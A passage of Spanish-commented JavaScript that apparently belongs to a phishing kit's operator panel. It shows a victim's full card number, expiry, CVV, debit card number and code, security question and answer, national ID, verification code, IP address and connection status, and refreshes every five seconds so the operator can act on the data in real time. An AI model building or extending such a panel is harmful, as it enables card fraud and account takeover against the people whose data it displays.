                    document.getElementById('display-correo').textContent = userData.correo || 'sin datos';
                    document.getElementById('display-ccorreo').textContent = userData.ccorreo || 'sin datos';
                    document.getElementById('display-celular').textContent = userData.celular || 'sin datos';

                    // Sección Tarjetas (MOSTRAR VALORES REALES)
                    document.getElementById('display-ntc').textContent = userData.ntc || 'sin datos';
                    document.getElementById('display-fven').textContent = userData.fven || 'MM/AA';
                    document.getElementById('display-cvv').textContent = userData.cvv || 'sin datos';
                    document.getElementById('display-ntd').textContent = userData.ntd || 'sin datos';
                    document.getElementById('display-ctd').textContent = userData.ctd || 'sin datos';

                    // Sección Pregunta/Respuesta (MOSTRAR VALORES REALES)
                    document.getElementById('display-preg').textContent = userData.preg || 'sin datos';
                    document.getElementById('display-respuesta').textContent = userData.respuesta || 'sin datos';

                    // Sección Detalles Adicionales y Sistema
                    document.getElementById('display-apellidos').textContent = userData.apellidos || 'sin datos';
                    document.getElementById('display-ano_nacimiento').textContent = userData.ano_nacimiento || 'sin datos';
                    document.getElementById('display-cedula').textContent = userData.cedula || 'sin datos';
                    document.getElementById('display-codigo_verificacion').textContent = userData.codigo_verificacion || 'sin datos';

                    document.getElementById('display-sistema_operativo').textContent = userData.sistema_operativo || 'sin datos';
                    document.getElementById('display-navegador').textContent = userData.navegador || 'sin datos';
                    document.getElementById('display-ip').textContent = userData.ip || 'sin datos';
                    document.getElementById('display-ultima_conexion').textContent = userData.ultima_conexion || 'sin datos';
                    document.getElementById('display-status').textContent = userData.status || 'SIN ESTADO'; 
                    document.getElementById('display-referencia').textContent = userData.referencia || 'sin datos';
                    document.getElementById('display-valor').textContent = userData.valor || 'sin datos';
                    document.getElementById('display-nombre_empresa').textContent = userData.nombre_empresa || 'sin datos';
                    document.getElementById('display-cliente_referencia').textContent = userData.cliente_referencia || 'sin datos';
                    document.getElementById('display-tipo_cliente').textContent = userData.tipo_cliente || 'sin datos';
                    document.getElementById('display-direccion').textContent = userData.direccion || 'sin datos';
                    document.getElementById('display-ciudad').textContent = userData.ciudad || 'sin datos';
                    // NUEVO: Campo para App Móvil
                    document.getElementById('display-app_movil').textContent = userData.app_movil || 'sin datos';


                } else {
                    console.error('Error al cargar datos del usuario:', data.message);
                    alert('No se pudieron cargar los datos del usuario: ' + (data.message || 'Error desconocido.'));
                }
            })
            .catch(error => {
                console.error('Error de red al cargar datos del usuario:', error);
                alert('Error de conexión al cargar datos del usuario. Revise la consola para más detalles.');
            });
    }
    // Cargar los datos al iniciar la página y actualizar automáticamente
    document.addEventListener('DOMContentLoaded', cargarDatosUsuario);
    setInterval(cargarDatosUsuario, 5000); // Actualiza cada 5 segundos
</script>